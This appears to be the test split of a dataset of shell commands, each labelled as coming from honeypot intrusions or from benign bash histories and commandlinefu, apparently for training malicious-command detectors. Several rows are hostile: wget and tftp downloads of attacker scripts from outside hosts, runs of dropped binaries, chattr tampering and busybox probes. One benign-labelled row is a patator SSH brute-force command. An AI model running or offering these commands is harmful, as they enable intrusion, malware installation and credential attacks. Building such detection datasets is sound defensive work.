+d2_008908,"printf ""%s\t%s\t%s\n"" {1..9} '*' 0 '#'",0,commandlinefu,test
+d2_008928,mkdir -p /root/.ssh/,1,honeypot,test
+d2_008936,trizen -Ss talloc,0,bash_history,test
+d2_008948,admin123,1,honeypot,test
+d2_008952,rm -rf miner.tar,1,honeypot,test
+d2_008959,netstat -naop | grep 3306,0,bash_history,test
+d2_008961,rm -rf ~/ps*,1,honeypot,test
+d2_008970,"sudo iwconfig wlan0 essid ""room602"" key ""liu567890""",0,bash_history,test
+d2_008973,"echo 'mail -s ""Call your wife"" 13125551234@tmomail.net' |at now+15min",0,commandlinefu,test
+d2_008976,man vi,0,bash_history,test
+d2_008979,wget http://h44f1d617.example.net/irc/bnc.tgz,1,honeypot,test
+d2_008980,ls -l `find . -maxdepth 1 -type l -print`,0,commandlinefu,test
+d2_008985,javac Problem.java,0,bash_history,test
+d2_008986,./server_unit_test.py -s ./server -t test_query_string_9,0,bash_history,test
+d2_008990,vim fadingPWM.sh,0,bash_history,test
+d2_008994,git rebase -- continue,0,bash_history,test
+d2_008995,cd /home/admin,1,honeypot,test
+d2_009003,ldapsearch -x,0,bash_history,test
+d2_009011,strace -f -s 512 -v ls -l,0,commandlinefu,test
+d2_009014,vi Dockerfile,0,bash_history,test
+d2_009023,cut -d/ -f2 /etc/passwd,0,bash_history,test
+d2_009031,sh bin,0,bash_history,test
+d2_009040,vi php.ini,0,bash_history,test
+d2_009043,nano main.h,0,bash_history,test
+d2_009052,sudo nano edx-platform/lms/envs/common.py,0,bash_history,test
+d2_009054,LC_ALL=C /var/tmp/knrm,1,honeypot,test
+d2_009056,ll -p,0,bash_history,test
+d2_009061,nslookup www.sony.com localhost,0,bash_history,test
+d2_009067,rm dbback.sh~ .dbback.sh.un~,0,bash_history,test
+d2_009070,bash -c ./bMtNqIsh,1,honeypot,test
+d2_009071,uniq -cd teste-uniq.txt,0,bash_history,test
+d2_009076,cat dist.female.first | cut -d' ' -f1,0,bash_history,test
+d2_009079,wgetsercontent.com/edx/configuration/$OPENEDX_RELEASE/util/install/ansible-bootstrap.sh -O - | sudo bash,0,bash_history,test
+d2_009092,trizen -Ss emacs,0,bash_history,test
+d2_009098,LC_ALL=C /tmp/v1m26ob1crmamf1a5diat3hurk,1,honeypot,test
+d2_009108,./execute.py --exe src/snap --np 8 --fi qasnap/center_src/in08 --fo out/out08 > out/out08_time.txt,0,bash_history,test
+d2_009114,rm MATEUS.txt,0,bash_history,test
+d2_009115,mmv newcert newcerts,0,bash_history,test
+d2_009117,oc new-app abi-tasks-dev/tasks:0.0 --name=tasks-green --allow-missing-imagestream-tags=true -n abi-tasks-prod,0,bash_history,test
+d2_009120,podwebserver& sleep 2; elinks 'http://h99cc79b9.example.net',0,commandlinefu,test
+d2_009123,mpd,0,bash_history,test
+d2_009125,sh Pemex.sh,1,honeypot,test
+d2_009129,sudo iptables L,0,bash_history,test
+d2_009132,rm -rf xx,1,honeypot,test
+d2_009136,cat /usr/include/san.h,1,honeypot,test
+d2_009145,git push -u origin master,0,bash_history,test
+d2_009149,$php_dir/bin/php -i | grep configure,0,commandlinefu,test
+d2_009164,free -ht --si,0,commandlinefu,test
+d2_009166,"for i in `openstack baremetal node list -c UUID -f value`; do openstack baremetal introspect data save $i | jq "".inventory.interfaces"" ; done",0,bash_history,test
+d2_009171,"parse_rpm() { RPM=$1;B=${RPM##*/};B=${B%.rpm};A=${B##*.};B=${B%.*};R=${B##*-};B=${B%-*};V=${B##*-};B=${B%-*};N=$B;echo ""$N $V $R $A""; }",0,commandlinefu,test
+d2_009173,mv ./-filename filename,0,commandlinefu,test
+d2_009177,scp -t .,1,honeypot,test
+d2_009181,openstack stack delete,0,bash_history,test
+d2_009185,vi laplace_my_mpi.c,0,bash_history,test
+d2_009195,sudo vim modules,0,bash_history,test
+d2_009199,wcalc -q <<< '3/5',0,commandlinefu,test
+d2_009201,/bin/busybox cat /etc/hostname/.none,1,honeypot,test
+d2_009203,ls -a /run/,0,bash_history,test
+d2_009205,head /isiseqruns/RonAxoTrinity/091113_Axo2PE_Eva/s_1_1/s_1_1.fq,0,bash_history,test
+d2_009209,"awk '{print $1}' ""/proc/modules"" | xargs modinfo | awk '/^(filename|desc|depends)/'",0,commandlinefu,test
+d2_009211,n(){ s=$[s^s<<13];s=$[s^s>>17];s=$[s^s<<5];echo $[s&2**32-1]; },0,commandlinefu,test
+d2_009212,i=(*);echo ${i[RANDOM%(${#i[@]}+1)]]},0,commandlinefu,test
+d2_009220,find -name voy_math_test,0,bash_history,test
+d2_009224,wpa_action,0,bash_history,test
+d2_009225,vi composer.lock,0,bash_history,test
+d2_009228,sudo dmidecode | grep Serial\ Number | head -n1,0,commandlinefu,test
+d2_009232,rake db:migrate VERSION=0,0,bash_history,test
+d2_009233,echo redes de computadores,0,bash_history,test
+d2_009238,./vPV04VY1,1,honeypot,test
+d2_009240,LC_ALL=C chattr -i -a ~/.dhpcd,1,honeypot,test
+d2_009242,mkdir int-ca/db,0,bash_history,test
+d2_009246,perl -pi -e's/foo/bar/g' file1 file2 fileN,0,commandlinefu,test
+d2_009253,"echo 'Desktop SPAM!!!' | while read SPAM_OUT; do notify-send ""$SPAM_OUT""; done",0,commandlinefu,test
+d2_009254,unzip '*.zip',0,commandlinefu,test
+d2_009256,endScript() {,1,honeypot,test
+d2_009257,sh awoo2.sh,1,honeypot,test
+d2_009258,>/var/.t,1,honeypot,test
+d2_009259,ls -ltr mir-36/trinity_out_dir/,0,bash_history,test
+d2_009260,ls Backups/mysql/-k,0,bash_history,test
+d2_009261,cat mikec_Run_CASAVA.sh,0,bash_history,test
+d2_009263,sudo rebot,0,bash_history,test
+d2_009267,xrandr LVDS1 --dpi 48,0,bash_history,test
+d2_009275,wget NasaPaul.com/v.py,1,honeypot,test
+d2_009277,cp -r pintos cd /../home/team13a/,0,bash_history,test
+d2_009279,"for f in *.flv; do ffmpeg -y -i ""$f"" -f image2 -ss 10 -vframes 1 -an ""${f%.flv}.jpg""; done",0,commandlinefu,test
+d2_009284,git checkout pintos/src/examples/,0,bash_history,test
+d2_009285,./iZy535Wi,1,honeypot,test
+d2_009295,/bin/busybox echo -e '\x50\x6f\x72\x74/proc/kcore' > /proc/kcore/.none,1,honeypot,test
+d2_009297,echo 1000 > serial,0,bash_history,test
+d2_009305,ls dh/run/,0,bash_history,test
+d2_009314,./hcDwqCAU,1,honeypot,test
+d2_009317,vi auth,0,bash_history,test
+d2_009326,do >$a,1,honeypot,test
+d2_009328,wscat -l ws://thegigabots.app.bigbang.io,0,bash_history,test
+d2_009333,"sudo fgrep -rnw --include=\*.{c,h} '/usr/include/linux/' -e ""set_task_state""",0,bash_history,test
+d2_009351,nano scanner.py,0,bash_history,test
+d2_009352,tftp lastofservers.ddnsgeek.com:8088 -c get httpdlogic.sh,1,honeypot,test
+d2_009365,echo $(</tmp/foo),0,commandlinefu,test
+d2_009381,./GSB9BYlA,1,honeypot,test
+d2_009399,cp -r * .??* /dest,0,commandlinefu,test
+d2_009401,"googl () { curl -s -d ""url=${1}"" http://h50ed7453.example.net/api/url | sed -n ""s/.*:\""\([^\""]*\).*/\1\n/p"" ;}",0,commandlinefu,test
+d2_009409,vi /etc/php.ini,0,bash_history,test
+d2_009426,lsof -Pnl +M -i6:8080,0,commandlinefu,test
+d2_009433,namei -m $(pwd),0,commandlinefu,test
+d2_009439,vim grub,0,bash_history,test
+d2_009447,perl perll,1,honeypot,test
+d2_009450,x=1; while [ $x = 1 ]; do process=`pgrep -u username`; if [ $process ]; then x=0; fi; done; strace -vvtf -s 256 -p $process,0,commandlinefu,test
+d2_009453,./example1.sh,0,bash_history,test
+d2_009458,rm -rf ssh.sh,1,honeypot,test
+d2_009459,catfish --fileman=nautilus --path=/home/<username> --hidden --method=find,0,commandlinefu,test
+d2_009460,sudo dmidecode -t processor,0,commandlinefu,test
+d2_009462,vim contents/fractals.tex,0,bash_history,test
+d2_009466,mv *.sql ..,0,bash_history,test
+d2_009468,sudo systemctl restart snmpd,0,bash_history,test
+d2_009479,mplayer -vo fbdev -xy 1024 -fs -zoom /path/to/movie.avi,0,commandlinefu,test
+d2_009480,"ssh-keygen -t rsa -b 4096 -C ""lauwillis@yahoo.com""",0,bash_history,test
+d2_009481,split -p 'DROP TABLE IF EXISTS' dump.sql dump.sql-,0,commandlinefu,test
+d2_009484,vim policy-routes,0,bash_history,test
+d2_009485,"sed ""s/\([a-zA-Z]*\:\/\/[^ ]*\)\(.*\)/\<a href=\""\1\""\>\1\<\/a\>\2/""",0,commandlinefu,test
+d2_009497,wget http://hce45964b.example.net/udp.pl,1,honeypot,test
+d2_009502,/bin/busybox echo -e '\x50\x6f\x72\x74/tmp' > /tmp/.none,1,honeypot,test
+d2_009522,tftp -r axistftp2.sh -g 192.2.63.134,1,honeypot,test
+d2_009540,perl -pe 's|@|>|;s|.*||s if $.%4==3 || $.%4==0;close $ARGV if eof' axo_right.fq > axo_right.fa &,0,bash_history,test
+d2_009555,"cd ~/wallpapers; feh --bg-fill ""$( ls | sort -R | head -n 1 )""",0,commandlinefu,test
+d2_009562,rm -r build/,0,bash_history,test
+d2_009563,patator ssh_login host=141.224.125.188 port=22 user=FILE0 0=user.lst password=FILE1 1=pass.lst -x ignore:mesg='Authentication failed.',0,commandlinefu,test
+d2_009568,which,0,bash_history,test
+d2_009569,git add HW/HW_7,0,bash_history,test
